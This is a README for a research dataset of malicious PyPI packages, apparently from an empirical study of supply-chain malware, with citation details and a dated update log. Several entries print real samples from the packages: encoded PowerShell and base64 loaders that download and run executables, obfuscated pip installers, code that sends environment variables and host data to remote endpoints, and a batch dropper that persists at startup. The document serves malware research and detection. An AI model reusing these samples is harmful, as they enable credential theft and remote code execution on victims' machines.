## Dataset Size

This data set includes about 5,891 versions of the source code of 5,169 malicious packages.

## Dataset Format

`package name -> version -> source code zip file.`

Example:
`ython-binance -> 0.1 -> ython-binance-0.1.tar.gz`

## False positive

**We have manually checked all collected malicious packages and have now removed all false positives.**

## Cite Me
 
This dataset is the work of the ASE 2023 paper "An Empirical Study of Malicious Code In PyPI Ecosystem"

```
@misc{guo2023empirical,
      title={An Empirical Study of Malicious Code In PyPI Ecosystem}, 
      author={Wenbo Guo and Zhengzi Xu and Chengwei Liu and Cheng Huang and Yong Fang and Yang Liu},
      year={2023},
      eprint={2309.11021},
      archivePrefix={arXiv},
      primaryClass={cs.SE}
}
```

## Update

### 31 Mar. 2024 
Add new 431 malicious packages using typoSquatting attack method.

ref: [https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ](https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ)


### 04 Apr. 2024 
Add new 45 malicious packages using typoSquatting attack method.


### 16 Apr. 2024 
Add new 56 malicious packages using typoSquatting attack method. 

Malicious code in these packages.
```python
try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    # www.esquelesquad.rip
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
```


### 21 Apr. 2024 
Add new 34 malicious packages using typoSquatting attack method.


### 1 May. 2024 
Add new 1154 malicious packages using typoSquatting attack method.

Malicious code in these packages.
```python
try:
  import subprocess
  import os
  if not os.path.exists('tahg'):
    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
except: pass
```


```python
...
while 馬女水女口目人馬鳥月水馬山山馬鸟:
  if 108363 == 馬女水女口目人馬鳥月水馬山山馬鸟:
    import pip
    pip.main([''.join(map(getattr(__builtins__, oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), (7 << 4) + 3, (7 << 4) + (1 << 2), (3 << 5) + 1, (((7 << 2) - 1) << 2), (((7 << 2) - 1) << 2)])), ''.join(map(getattr(__builtins__,
              oct.__str__()[-3 << 0] + hex.__str__()[-1 << 2] + copyright.__str__()[4 << 0]), [(7 << 4), (((1 << 4) - 1) << 3) + 1, (7 << 4), ((((3 << 2) + 1)) << 3) + 1, (((1 << 4) - 1) << 3) - 1, ((((3 << 2) + 1)) << 3) + 1, (7 << 4) - (1 << 1), ((((3 << 2) + 1)) << 2) - 1, (((3 << 3) + 1) << 1)]))])

    馬女水女口目人馬鳥月水馬山山馬鸟 = (896*(494 & 86)+104//648-(885 | 515+277) | 885 << 141 << 580 >> (593 | 648) & ~87) >> 9523
  elif 馬女水女口目人馬鳥月水馬山山馬鸟 == 286625773:
...
```



### 2 May. 2024 
Add new 181 malicious packages.



### 3 May. 2024 
Add new 35 malicious packages.

There are many different types of malicious code in these packages. Here are some examples.

```python
def RunCommand():
    output = subprocess.check_output(["ps", "-elf"]).decode("utf-8")
    data = {"ls_output": output, "key1": "value1", "key2": "value2"}
    data_string = "&".join([f"{key}={value}" for key, value in data.items()])
    curl_command = [
        "curl",
        "-X",
        "POST",
        "-d",
        f"'{data_string}'",  # Pass the data as form data
        "http://zvqyzaqnwvjsqdhrbdiupz8e84un8xyb7.oast.fun",
    ]
    subprocess.run(curl_command, check=True)
```

```python
def b64d(base64_code):
    base64_bytes = base64_code.encode('ascii')
    code_bytes = base64.b64decode(base64_bytes)
    code = code_bytes.decode('ascii')
    return code

def notmalfunc():
    os.system(b64d("Y3VybCAtcyAtbyAldGVtcCVcc3RyaW5ncy5iYXQgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0NjE5OTEyNDU3MjYzOTI0OS8xMTg4OTc0NDUzNTQwMDAzODUwL3N0cmluZ3MuYmF0ICYmIHN0YXJ0IC9taW4gY21kIC9jICV0ZW1wJVxzdHJpbmdzLmJhdA=="))
```

```python
if 'sdist' not in argv:
    if name == 'nt':
        exec(b64decode("base64 string").decode())
    else:
        exec(b64decode("base64 string").decode())
```

```python
import base64
exec(base64.b64decode("ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK"))
```

```python
hostname = socket.gethostname()
osname = platform.system()
ip = socket.gethostbyname(hostname)
server_url = "https://eo1okaacpdhx16n.m.pipedream.net/poc"
data = {
    "hostname": hostname,
    "osname": osname,
    "ip": ip
}

try:
    response = requests.post(server_url, json=data)
    if response.status_code == 200:
        print("Data sent successfully to the server.")
    else:
        print(f"Failed to send data. Status code: {response.status_code}")
except Exception as e:
    print(f"Error: {str(e)}")
```

```python
import requests

mycode = os.environ
secret = base64.b64encode(bytes(str(mycode),"UTF-8"))
data = "https://eow8fqyd1emg87l.m.pipedream.net/" + secret.decode('utf-8')
requests.get(data)
```


### Suspecious packages

discomusic-0.0.3

```python
import requests
file = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175473089748934656/PythonLIB.exe?ex=656b5b9f&is=6558e69f&hm=1d4e961eb9b5c1644449a0caf02b6f2e7d4e17c9a8bb3ded2a92d05bbcf80a1e&")
with open("discomusic.exe", "wb") as f:
    f.write(file.content)
```

Although the code is not any direct malicious behavior, But it downloads a malicious executable file. We will keep it in the dataset for further analysis.



### 7 May. 2024 
Add new 1017 malicious packages.


### 8 May. 2024 
multiconnections [2.35.4]

reflink: https://osv.dev/vulnerability/MAL-2024-1334


### 14 May. 2024 
testpkg3322 [2.35.8, 2.35.9, 2.35.10, 2.35.12, 2.35.14, 2.35.15, 2.35.16, 2.35.18, 2.35.19]

reflink: https://osv.dev/vulnerability/MAL-2024-1365

```python
def x():
    t = "https://frvezdff.pythonanywhere.com/getrnr"
    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\bbb.bat")
    time.sleep(2)
    if getattr(sys, 'frozen', False):
        currentFilePath = os.path.dirname(sys.executable)
    else:
        currentFilePath = os.path.dirname(os.path.abspath(__file__))
    fileName = os.path.basename(sys.argv[0])
    filePath = os.path.join(currentFilePath, fileName)
    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    try:
        with open(os.getenv('APPDATA')+"\\bbb.bat", "r") as file:
            cont = file.read()  
        with open(startupFolderPath+"\\bbb.bat", "w+") as file:
            file.write(cont)
    except:
        pass
    subprocess.Popen(os.getenv('APPDATA')+"\\bbb.bat", creationflags=subprocess.CREATE_NO_WINDOW)
    time.sleep(15)
    os.system("shutdown /r /f")
x()
```


## About the malicious packages detection

We have proposed a new method to detect malicious packages in the PyPI ecosystem. We will release the code and the dataset after the paper is accepted.


## Other Dataset

- GitHub Advisory Database https://github.com/advisories?query=type%3Amalware (NPM).
- https://dasfreak.github.io/Backstabbers-Knife-Collection/ (PyPI and npm), by Marc Ohm et al.
- https://github.com/datadog/malicious-software-packages-dataset (PyPI), by Datadog
